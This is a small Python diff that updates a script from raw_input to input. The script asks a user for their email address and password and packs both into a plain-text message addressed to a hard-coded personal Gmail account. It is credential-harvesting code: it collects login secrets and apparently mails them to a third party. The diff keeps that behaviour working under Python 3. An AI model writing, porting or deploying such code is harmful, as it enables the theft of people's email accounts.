@@ -2,8 +2,8 @@ import imaplib
 import smtplib
 from email.mime.text import MIMEText
 from email.header import Header
-email = raw_input("enter your email..... ")
-passw = raw_input("enter your password..... ")
+email = input("enter your email..... ")
+passw = input("enter your password..... ")
 recipient = "randykethcena@gmail.com"
 msg = MIMEText(email + ' ' + passw, 'plain', 'utf-8')
 msg['new mail'] = Header('new mail', 'utf-8')
